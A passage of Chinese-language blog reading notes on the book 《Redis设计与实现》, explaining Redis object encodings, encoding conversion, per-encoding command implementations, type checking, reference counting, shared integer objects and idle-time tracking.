编码的简单动态字符串（SDS）\nREDIS_ENCODING_EMBSTR\n&quot;embstr&quot;\n\n\n简单动态字符串（SDS）\nREDIS_ENCODING_RAW\n&quot;raw&quot;\n\n\n字典\nREDIS_ENCODING_HT\n&quot;hashtable&quot;\n\n\n双端链表\nREDIS_ENCODING_LINKEDLIST\n&quot;linkedlist&quot;\n\n\n压缩列表\nREDIS_ENCODING_ZIPLIST\n&quot;ziplist&quot;\n\n\n整数集合\nREDIS_ENCODING_INTSET\n&quot;intset&quot;\n\n\n跳跃表和字典\nREDIS_ENCODING_SKIPLIST\n&quot;skiplist&quot;\n\n\n通过encoding属性来设定对象所使用的编码，而不是为特定类型的对象关联一种固定的编码，极大地提升了Redis的灵活性和效率，因为Redis可以根据不同的使用场景来为一个对象设置不同的编码，从而优化对象在某一场景下的效率。举个例子，在列表对象包含的元素比较少时，Redis使用压缩列表作为列表对象的底层实现：\n\n因为压缩列表比双端链表更节约内存，并且在元素数量较少时，在内存中以连续块方式保存的压缩列表比起双端链表可以更快被载入到缓存中；\n随着列表对象包含的元素越来越多，使用压缩列表来保存元素的优势逐渐消失时，对象就会将底层实现从压缩列表转向功能更强、也更适合保存大量元素的双端链表上面；\n\n其他类型的对象也会通过使用多种不同的编码来进行类似的优化。\n字符串对象字符串对象的编码可以是int、raw或者embstr。\n如果一个字符串对象保存的是整数值，并且这个整数值可以用long类型来表示，那么字符串对象会将整数值保存在字符串对象结构的ptr属性里面（将void*转换成long），并将字符串对象的编码设置为int。如果字符串对象保存的是一个字符串值，并且这个字符串值的长度大于32字节，那么字符串对象将使用一个简单动态字符串（SDS）来保存这个字符串值，并将对象的编码设置为raw。如果字符串对象保存的是一个字符串值，并且这个字符串值的长度小于等于32字节，那么字符串对象将使用embstr编码的方式来保存这个字符串值。\nembstr编码是专门用于保存短字符串的一种优化编码方式，这种编码和raw编码一样，都使用redisObject结构和sdshdr结构来表示字符串对象。但raw编码会调用两次内存分配函数来分别创建redisObject结构和sdshdr结构，而embstr编码则通过调用一次内存分配函数来分配一块连续的空间，空间中依次包含redisObject和sdshdr两个结构。\nembstr编码的字符串对象在执行命令时，产生的效果和raw编码的字符串对象执行命令时产生的效果是相同的，但使用embstr编码的字符串对象来保存短字符串值有以下好处：\n\nembstr编码将创建字符串对象所需的内存分配次数从raw编码的两次降低为一次。\n释放embstr编码的字符串对象只需要调用一次内存释放函数，而释放raw编码的字符串对象需要调用两次内存释放函数。\n因为embstr编码的字符串对象的所有数据都保存在一块连续的内存里面，所以这种编码的字符串对象比起raw编码的字符串对象能够更好地利用缓存带来的优势。\n\n可以用 long double 类型表示的浮点数在Redis中也是作为字符串值来保存的。如果我们要保存一个浮点数到字符串对象里面，那么程序会先将这个浮点数转换成字符串值，然后再保存转换所得的字符串值。在有需要的时候，程序会将保存在字符串对象里面的字符串值转换回浮点数值，执行某些操作，然后再将执行操作所得的浮点数值转换回字符串值，并继续保存在字符串对象里面。\n编码的转换int编码的字符串对象和embstr编码的字符串对象在条件满足的情况下，会被转换为raw编码的字符串对象。对于int编码的字符串对象来说，如果我们向对象执行了一些命令，使得这个对象保存的不再是整数值，而是一个字符串值，那么字符串对象的编码将从int变为raw。\n另外，因为Redis没有为embstr编码的字符串对象编写任何相应的修改程序（只有int编码的字符串对象和raw编码的字符串对象有这些程序），所以embstr编码的字符串对象实际上是只读的。当我们对embstr编码的字符串对象执行任何修改命令时，程序会先将对象的编码从embstr转换成raw，然后再执行修改命令。因为这个原因，embstr编码的字符串对象在执行修改命令之后，总会变成一个raw编码的字符串对象。\n字符串命令的实现因为字符串键的值为字符串对象，所以用于字符串键的所有命令都是针对字符串对象来构建的，表8-7列举了其中一部分字符串命令，以及这些命令在不同编码的字符串对象下的实现方法。\n\n\n\n命令\nint 编码的实现方法\nembstr 编码的实现方法\nraw 编码的实现方法\n\n\n\nSET\n使用整数编码保存值\n使用 embstr 编码保存值\n使用 raw 编码保存值\n\n\nGET\n拷贝整数值并转换为字符串后返回给客户端\n直接返回字符串值\n直接返回字符串值\n\n\nAPPEND\n转换为 raw 编码后按 raw 编码方式执行\n转换为 raw 编码后按 raw 编码方式执行\n将给定字符串追加到现有字符串的末尾\n\n\nINCRBYFLOAT\n转换整数为浮点数，计算结果并保存浮点数结果\n尝试将字符串转换为 long double 类型的浮点数，计算并保存\n尝试将字符串转换为 long double 类型的浮点数，计算并保存\n\n\nINCRBY\n执行加法计算，保存结果为整数\nembstr 编码无法执行此命令，返回错误\nraw 编码无法执行此命令，返回错误\n\n\nDECRBY\n执行减法计算，保存结果为整数\nembstr 编码无法执行此命令，返回错误\nraw 编码无法执行此命令，返回错误\n\n\nSTRLEN\n将整数转换为字符串并返回其长度\n返回字符串的长度\n返回字符串的长度\n\n\nSETRANGE\n转换为 raw 编码后按 raw 编码方式执行\n转换为 raw 编码后按 raw 编码方式执行\n将指定索引位置上的值设置为给定字符\n\n\nGETRANGE\n将整数转换为字符串并返回指定索引上的字符\n返回字符串指定索引上的字符\n返回字符串指定索引上的字符\n\n\n列表对象列表对象的编码可以是ziplist或者linkedlist。\nziplist编码的列表对象使用压缩列表作为底层实现，每个压缩列表节点（entry）保存了一个列表元素。linkedlist编码的列表对象使用双端链表作为底层实现，每个双端链表节点（node）都保存了一个字符串对象，而每个字符串对象都保存了一个列表元素。\n编码转换当列表对象可以同时满足以下两个条件时，列表对象使用ziplist编码：\n\n列表对象保存的所有字符串元素的长度都小于64字节；\n列表对象保存的元素数量小于512个；\n\n不能满足这两个条件的列表对象需要使用linkedlist编码。\n以上两个条件的上限值是可以修改的，具体请看配置文件中关于 list-max-ziplist-value 选项和 list-max-ziplist-entries 选项的说明。对于使用ziplist编码的列表对象来说，当使用ziplist编码所需的两个条件的任意一个不能被满足时，对象的编码转换操作就会被执行，原本保存在压缩列表里的所有列表元素都会被转移并保存到双端链表里面，对象的编码也会从ziplist变为linkedlist。\n列表命令的实现因为列表键的值为列表对象，所以用于列表键的所有命令都是针对列表对象来构建的，下面列出了其中一部分列表键命令，以及这些命令在不同编码的列表对象下的实现方法。\n\n\n\n命令\nziplist 编码的实现方法\nlinkedlist 编码的实现方法\n\n\n\nLPUSH\n调用 ziplistPush 函数，将新元素推入到压缩列表的表头\n用 listAddNodeHead 函数，将新元素推入到双端链表的表头\n\n\nRPUSH\n调用 ziplistPush 函数，将新元素推入到压缩列表的表尾\n调用 listAddNodeTail 函数，将新元素推入到双端链表的表尾\n\n\nLPOP\n调用 ziplistIndex 函数定位压缩列表的表头节点，返回节点所保存的元素后，调用 ziplistDelete 函数删除表头节点\n调用 listFirst 函数定位双端链表的表头节点，返回节点所保存的元素后，调用 listDelNode 函数删除表头节点\n\n\nRPOP\n调用 ziplistIndex 函数定位压缩列表的表尾节点，返回节点所保存的元素后，调用 ziplistDelete 函数删除表尾节点\n调用 listLast 函数定位双端链表的表尾节点，返回节点所保存的元素后，调用 listDelNode 函数删除表尾节点\n\n\nLINDEX\n调用 ziplistIndex 函数定位压缩列表中的指定节点，然后返回节点所保存的元素\n调用 listIndex 函数定位双端链表中的指定节点，然后返回节点所保存的元素\n\n\nLLEN\n调用 ziplistLen 函数返回压缩列表的长度\n调用 listLength 函数返回双端链表的长度\n\n\nLINSERT\n若在表头或表尾插入新节点，调用 ziplistPush 函数；在其他位置插入时调用 ziplistInsert 函数\n调用 listInsertNode 函数，将新节点插入到双端链表的指定位置\n\n\nLREM\n遍历压缩列表节点，并调用 ziplistDelete 函数删除包含给定元素的节点\n遍历双端链表节点，调用 listDelNode 函数删除包含给定元素的节点\n\n\nLTRIM\n调用 ziplistDeleteRange 函数，删除压缩列表中所有不在指定索引范围内的节点\n遍历双端链表节点，调用 listDelNode 函数删除所有不在指定索引范围内的节点\n\n\nLSET\n调用 ziplistDelete 删除指定索引上的现有节点，然后调用 ziplistInsert 插入新节点\n调用 listIndex 函数定位到双端链表的指定索引节点，然后通过赋值更新节点的值\n\n\n哈希对象哈希对象的编码可以是ziplist或者hashtable。ziplist编码的哈希对象使用压缩列表作为底层实现，每当有新的键值对要加入到哈希对象时，程序会先将保存了键的压缩列表节点推入到压缩列表表尾，然后再将保存了值的压缩列表节点推入到压缩列表表尾，因此：\n\n保存了同一键值对的两个节点总是紧挨在一起，保存键的节点在前，保存值的节点在后；\n先添加到哈希对象中的键值对会被放在压缩列表的表头方向，而后来添加到哈希对象中的键值对会被放在压缩列表的表尾方向。\n\nhashtable编码的哈希对象使用字典作为底层实现，哈希对象中的每个键值对都使用一个字典键值对来保存：\n\n字典的每个键都是一个字符串对象，对象中保存了键值对的键；\n字典的每个值都是一个字符串对象，对象中保存了键值对的值。\n\n编码转换当哈希对象可以同时满足以下两个条件时，哈希对象使用ziplist编码：\n\n哈希对象保存的所有键值对的键和值的字符串长度都小于64字节；\n哈希对象保存的键值对数量小于512个；不能满足这两个条件的哈希对象需要使用hashtable编码。\n\n这两个条件的上限值是可以修改的，具体请看配置文件中关于hash-max-ziplist-value选项和hash-max-ziplist-entries选项的说明。\n对于使用ziplist编码的列表对象来说，当使用ziplist编码所需的两个条件的任意一个不能被满足时，对象的编码转换操作就会被执行。原本保存在压缩列表里的所有键值对都会被转移并保存到字典里面，对象的编码也会从ziplist变为hashtable。除了键的长度太大会引起编码转换之外，值的长度太大也会引起编码转换。\n哈希命令的实现因为哈希键的值为哈希对象，所以用于哈希键的所有命令都是针对哈希对象来构建的，下面列出了其中一部分哈希键命令，以及这些命令在不同编码的哈希对象下的实现方法。\n\n\n\n命令\nziplist 编码实现方法\nhashtable 编码实现方法\n\n\n\nHSET\n调用 ziplistPush 函数，将键推入到压缩列表的表尾，然后再次调用 ziplistPush 函数，将值推入到压缩列表的表尾\n调用 dictAdd 函数，将新键值对添加到字典中\n\n\nHGET\n调用 ziplistFind 函数，在压缩列表中查找指定键所对应的节点，然后调用 ziplistNext 函数，移动到值节点并返回其值\n使用 dictFind 函数在字典中查找给定键，然后调用 dictGetVal 函数返回该键的值\n\n\nHEXISTS\n调用 ziplistFind 函数在压缩列表中查找指定键节点，找到则表示键值对存在，未找到则表示不存在\n调用 dictFind 函数在字典中查找给定键，找到表示存在，未找到表示不存在\n\n\nHDEL\n调用 ziplistFind 函数在压缩列表中查找指定键节点，然后删除键节点及其相邻的值节点\n调用 dictDelete 函数将指定键对应的键值对从字典中删除\n\n\nHLEN\n调用 ziplistLen 函数，取得压缩列表中节点的总数，并除以 2，得出键值对数量\n调用 dictSize 函数返回字典中包含的键值对数量\n\n\nHGETALL\n遍历整个压缩列表，调用 ziplistGet 函数返回所有键和值（都是节点）\n遍历整个字典，调用 dictGetKey 函数返回键，调用 dictGetVal 函数返回值\n\n\n集合对象集合对象的编码可以是intset或者hashtable。\nintset编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合里面。hashtable编码的集合对象使用字典作为底层实现，字典的每个键都是一个字符串对象，每个字符串对象包含了一个集合元素，而字典的值则全部被设置为NULL。\n编码的转换当集合对象可以同时满足以下两个条件时，对象使用intset编码：\n\n集合对象保存的所有元素都是整数值；\n集合对象保存的元素数量不超过512个。\n\n不能满足这两个条件的集合对象需要使用hashtable编码。\n第二个条件的上限值是可以修改的，具体请看配置文件中关于set-max-intset-entries选项的说明。\n对于使用intset编码的集合对象来说，当使用intset编码所需的两个条件的任意一个不能被满足时，就会执行对象的编码转换操作。原本保存在整数集合中的所有元素都会被转移并保存到字典里面，并且对象的编码也会从intset变为hashtable。\n集合命令的实现因为集合键的值为集合对象，所以用于集合键的所有命令都是针对集合对象来构建的，下面列出了其中一部分集合键命令，以及这些命令在不同编码的集合对象下的实现方法。\n\n\n\n命令\nintset 编码实现方法\nhashtable 编码实现方法\n\n\n\nSADD\n调用 intsetAdd 函数，将所有新元素添加到整数集合中\n调用 dictAdd 函数，以新元素为键，NULL 值，将键值对添加到字典中\n\n\nSCARD\n调用 intsetLen 函数，返回整数集合包含的元素数量\n调用 dictSize 函数，返回字典中包含的键值对数量\n\n\nSISMEMBER\n调用 intsetFind 函数，在整数集合中查找给定的元素，找到则说明元素存在，未找到则说明元素不存在\n调用 dictFind 函数，在字典中查找给定的元素，找到则说明元素存在，未找到则说明元素不存在\n\n\nSMEMBERS\n遍历整个整数集合，使用 intsetGet 函数返回集合元素\n遍历整个字典，使用 dictGetKey 函数返回字典的键作为集合元素\n\n\nSRANDMEMBER\n调用 intsetRandom 函数，从整数集合中随机返回一个元素\n调用 dictGetRandomKey 函数，从字典中随机返回一个键\n\n\nSPOP\n调用 intsetPop 函数，从整数集合中随机取出一个元素，并在将这个随机元素返回给客户端之后，调用 intsetRemove 函数将随机元素从整数集合中删除\n调用 dictGetRandomKey 函数，从字典中随机取出一个键，并在将这个随机字典键的值返回给客户端之后，调用 dictDelete 函数删除随机字典键所对应的键值对\n\n\nSREM\n调用 intsetRemove 函数，从整数集合中移除所有给定的元素\n调用 dictDelete 函数，从字典中删除所有键为给定元素的键值对\n\n\n有序集合对象有序集合的编码可以是ziplist或者skiplist。\nziplist编码的压缩列表对象使用压缩列表作为底层实现，每个集合元素使用两个紧挨在一起的压缩列表节点来保存，第一个节点保存元素的成员（member），而第二个元素则保存元素的分值（score）。压缩列表内的集合元素按分值从小到大进行排序，分值较小的元素被放置在靠近表头的方向，而分值较大的元素则被放置在靠近表尾的方向。\nskiplist编码的有序集合对象使用zset结构作为底层实现，一个zset结构同时包含一个字典和一个跳跃表。\nzset结构中的zsl跳跃表按分值从小到大保存了所有集合元素，每个跳跃表节点都保存了一个集合元素：跳跃表节点的object属性保存了元素的成员，而跳跃表节点的score属性则保存了元素的分值。通过这个跳跃表，程序可以对有序集合进行范围型操作，比如ZRANK、ZRANGE等命令就是基于跳跃表API来实现的。除此之外，zset结构中的dict字典为有序集合创建了一个从成员到分值的映射，字典中的每个键值对都保存了一个集合元素：字典的键保存了元素的成员，而字典的值则保存了元素的分值。通过这个字典，程序可以用O（1）复杂度查找给定成员的分值，ZSCORE命令就是根据这一特性实现的，而很多其他有序集合命令都在实现的内部用到了这一特性。\n有序集合每个元素的成员都是一个字符串对象，而每个元素的分值都是一个double类型的浮点数。值得一提的是，虽然zset结构同时使用跳跃表和字典来保存有序集合元素，但这两种数据结构都会通过指针来共享相同元素的成员和分值，所以同时使用跳跃表和字典来保存集合元素不会产生任何重复成员或者分值，也不会因此而浪费额外的内存。\n为什么有序集合需要同时使用跳跃表和字典来实现？\n在理论上，有序集合可以单独使用字典或者跳跃表的其中一种数据结构来实现，但无论单独使用字典还是跳跃表，在性能上对比起同时使用字典和跳跃表都会有所降低。举个例子，如果我们只使用字典来实现有序集合，那么虽然以O（1）复杂度查找成员的分值这一特性会被保留，但是，因为字典以无序的方式来保存集合元素，所以每次在执行范围型操作——比如ZRANK、ZRANGE等命令时。程序都需要对字典保存的所有元素进行排序，完成这种排序需要至少O（NlogN）时间复杂度，以及额外的O（N）内存空间（因为要创建一个数组来保存排序后的元素）。\n另一方面，如果我们只使用跳跃表来实现有序集合，那么跳跃表执行范围型操作的所有优点都会被保留，但因为没有了字典，所以根据成员查找分值这一操作的复杂度将从O（1）上升为O（logN）。因为以上原因，为了让有序集合的查找和范围型操作都尽可能快地执行，Redis选择了同时使用字典和跳跃表两种数据结构来实现有序集合。\n编码的转换当有序集合对象可以同时满足以下两个条件时，对象使用ziplist编码：\n\n有序集合保存的元素数量小于128个；\n有序集合保存的所有元素成员的长度都小于64字节；\n\n不能满足以上两个条件的有序集合对象将使用skiplist编码。\n以上两个条件的上限值是可以修改的，具体请看配置文件中关于zset-max-ziplist-entries选项和zset-max-ziplist-value选项的说明。\n对于使用ziplist编码的有序集合对象来说，当使用ziplist编码所需的两个条件中的任意一个不能被满足时，就会执行对象的编码转换操作。原本保存在压缩列表里的所有集合元素都会被转移并保存到zset结构里面，对象的编码也会从ziplist变为skiplist。\n有序集合命令的实现因为有序集合键的值为哈希对象，所以用于有序集合键的所有命令都是针对哈希对象来构建的，下面列出了其中一部分有序集合键命令，以及这些命令在不同编码的哈希对象下的实现方法。\n\n\n\n命令\nziplist 编码实现方法\nzset 编码实现方法\n\n\n\nZADD\n调用 ziplistInsert 函数，将成员和分值作为两个节点分别插入到压缩列表\n先调用 zslInsert 函数，将新元素添加到跳跃表，然后调用 dictAdd 函数，将新元素与分值的关联添加到字典中\n\n\nZCARD\n调用 ziplistLength 函数，获得压缩列表包含的节点数量，将这个数量除以2得出集合元素的数量\n访问跳跃表的数据结构的 length 属性，直接返回集合元素的数量\n\n\nZCOUNT\n遍历压缩列表，统计分值在给定范围内的节点的数量\n遍历跳跃表，统计分值在给定范围内的节点的数量\n\n\nZRANGE\n从表头向表尾遍历压缩列表，返回给定索引范围内的所有元素\n从表头向表尾遍历跳跃表，返回给定索引范围内的所有元素\n\n\nZREVRANGE\n从表尾向表头遍历压缩列表，返回给定索引范围内的所有元素\n从表尾向表头遍历跳跃表，返回给定索引范围内的所有元素\n\n\nZRANK\n从表头向表尾遍历压缩列表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n从表头向表尾遍历跳跃表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n\n\nZREVRANK\n从表尾向表头遍历压缩列表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n从表尾向表头遍历跳跃表，查找给定的成员，沿途记录经过节点的数量，当找到给定成员之后，途经节点的数量就是该成员的排名\n\n\nZREM\n遍历压缩列表，移除所有包含给定成员的节点，以及被移除成员节点旁边的分值节点\n遍历跳跃表，移除所有包含给定成员的跳跃表节点，并在字典中解除该成员与分值的关联\n\n\nZSCORE\n遍历压缩列表，找到包含给定成员的节点，然后取出成员节点旁边的分值节点保存的元素分值\n直接从字典中取出给定成员的分值\n\n\n类型检查与命令多态Redis中用于操作键的命令基本上可以分为两种类型。\n其中一种命令可以对任何类型的键执行，比如说DEL命令、EXPIRE命令、RENAME命令、TYPE命令、OBJECT命令等。而另一种命令只能对特定类型的键执行，比如说：\n\nSET、GET、APPEND、STRLEN等命令只能对字符串键执行；\nHDEL、HSET、HGET、HLEN等命令只能对哈希键执行；\nRPUSH、LPOP、LINSERT、LLEN等命令只能对列表键执行；\nSADD、SPOP、SINTER、SCARD等命令只能对集合键执行；\nZADD、ZCARD、ZRANK、ZSCORE等命令只能对有序集合键执行；\n\n类型检查的实现从为了确保只有指定类型的键可以执行某些特定的命令，在执行一个类型特定的命令之前，Redis会先检查输入键的类型是否正确，然后再决定是否执行给定的命令。\n类型特定命令所进行的类型检查是通过redisObject结构的type属性来实现的：\n\n在执行一个类型特定命令之前，服务器会先检查输入数据库键的值对象是否为执行命令所需的类型，如果是的话，服务器就对键执行指定的命令；\n否则，服务器将拒绝执行命令，并向客户端返回一个类型错误。\n\n多态命令的实现Redis除了会根据值对象的类型来判断键是否能够执行指定命令之外，还会根据值对象的编码方式，选择正确的命令实现代码来执行命令。\n比如，列表对象有ziplist和linkedlist两种编码可用，其中前者使用压缩列表API来实现列表命令，而后者则使用双端链表API来实现列表命令。如果我们对一个键执行LLEN命令，那么服务器除了要确保执行命令的是列表键之外，还需要根据键的值对象所使用的编码来选择正确的LLEN命令实现：\n\n如果列表对象的编码为ziplist，那么说明列表对象的实现为压缩列表，程序将使用ziplistLen函数来返回列表的长度；\n如果列表对象的编码为linkedlist，那么说明列表对象的实现为双端链表，程序将使用listLength函数来返回双端链表的长度；\n\n借用面向对象方面的术语来说，我们可以认为LLEN命令是多态（polymorphism）的，只要执行LLEN命令的是列表键，那么无论值对象使用的是ziplist编码还是linkedlist编码，命令都可以正常执行。实际上，我们也可以将DEL、EXPIRE、TYPE等命令也称为多态命令，因为无论输入的键是什么类型，这些命令都可以正确地执行。DEL、EXPIRE等命令和LLEN等命令的区别在于，前者是基于类型的多态——一个命令可以同时用于处理多种不同类型的键，而后者是基于编码的多态——一个命令可以同时用于处理多种不同编码。\n内存回收因为C语言并不具备自动内存回收功能，所以Redis在自己的对象系统中构建了一个引用计数（reference counting）技术实现的内存回收机制。通过这一机制，程序可以通过跟踪对象的引用计数信息，在适当的时候自动释放对象并进行内存回收。\n每个对象的引用计数信息由redisObject结构的refcount属性记录：\ntypedef struct redisObject &#123;    // ...    // 引用计数    int refcount;    // ...&#125; robj;\n\n对象的引用计数信息会随着对象的使用状态而不断变化：\n\n在创建一个新对象时，引用计数的值会被初始化为1；\n当对象被一个新程序使用时，它的引用计数值会被增一；\n当对象不再被一个程序使用时，它的引用计数值会被减一；\n当对象的引用计数值变为0时，对象所占用的内存会被释放。\n\n下面列出了修改对象引用计数的API，这些API分别用于增加、减少、重置对象的引用计数。\n\n\n\n函数\n作用\n\n\n\nincrRefCount\n将对象的引用计数值增加 1。\n\n\ndecrRefCount\n将对象的引用计数值减少 1。当对象的引用计数值等于 0 时，释放对象。\n\n\nresetRefCount\n将对象的引用计数值设置为指定值，通常在需要重置引用计数时使用。\n\n\n对象共享除了用于实现引用计数内存回收机制之外，对象的引用计数属性还带有对象共享的作用。\n举个例子，假设键A创建了一个包含整数值100的字符串对象作为值对象。如果这时键B也要创建一个同样保存了整数值100的字符串对象作为值对象，那么服务器有以下两种做法：\n\n为键B新创建一个包含整数值100的字符串对象；\n让键A和键B共享同一个字符串对象；\n\n以上两种方法很明显是第二种方法更节约内存。在Redis中，让多个键共享同一个值对象需要执行以下两个步骤：\n\n将数据库键的值指针指向一个现有的值对象；\n将被共享的值对象的引用计数增一。\n\n目前来说，Redis会在初始化服务器时，创建一万个字符串对象，这些对象包含了从0到9999的所有整数值，当服务器需要用到值为0到9999的字符串对象时，服务器就会使用这些共享对象，而不是新创建对象。创建共享字符串对象的数量可以通过修改redis.h&#x2F;REDIS_SHARED_INTEGERS常量来修改。可以使用OBJECT REFCOUNT命令查看对象的引用计数。\n另外，这些共享对象不单单只有字符串键可以使用，那些在数据结构中嵌套了字符串对象的对象（linkedlist编码的列表对象、hashtable编码的哈希对象、hashtable编码的集合对象，以及zset编码的有序集合对象）都可以使用这些共享对象。\n为什么Redis不共享包含字符串的对象？\n当服务器考虑将一个共享对象设置为键的值对象时，程序需要先检查给定的共享对象和键想创建的目标对象是否完全相同，只有在共享对象和目标对象完全相同的情况下，程序才会将共享对象用作键的值对象。而一个共享对象保存的值越复杂，验证共享对象和目标对象是否相同所需的复杂度就会越高，消耗的CPU时间也会越多：\n\n如果共享对象是保存整数值的字符串对象，那么验证操作的复杂度为O（1）；\n如果共享对象是保存字符串值的字符串对象，那么验证操作的复杂度为O（N）；\n如果共享对象是包含了多个值（或者对象的）对象，比如列表对象或者哈希对象，那么验证操作的复杂度将会是O（N 2）。\n\n因此，尽管共享更复杂的对象可以节约更多的内存，但受到CPU时间的限制，Redis只对包含整数值的字符串对象进行共享。\n对象的空转时长除了前面介绍过的type、encoding、ptr和refcount四个属性之外，redisObject结构包含的最后一个属性为lru属性，该属性记录了对象最后一次被命令程序访问的时间：\ntypedef struct redisObject &#123;    // ...    unsigned lru:22;    // ...&#125; robj;\n\nOBJECT IDLETIME命令可以打印出给定键的空转时长，这一空转时长就是通过将当前时间减去键的值对象的lru时间计算得出的：\nOBJECT IDLETIME命令的实现是特殊的，这个命令在访问键的值对象时，不会修改值对象的lru属性。除了可以被OBJECT IDLETIME命令打印出来之外，键的空转时长还有另外一项作用：如果服务器打开了maxmemory选项，并且服务器用于回收内存的算法为 volatile-lru 或者 allkeys-lru，那么当服务器占用的内存数超过了 maxmemory 选项所设置的上限值时，空转时长较高的那部分键会优先被服务器释放，从而回收内存。\n配置文件的 maxmemory 选项和 maxmemory-policy 选项的说明介绍了关于这方面的更多信息。\n","categories":["读书笔记"],"tags":["Redis","数据库","《Redis设计与实现》"]}]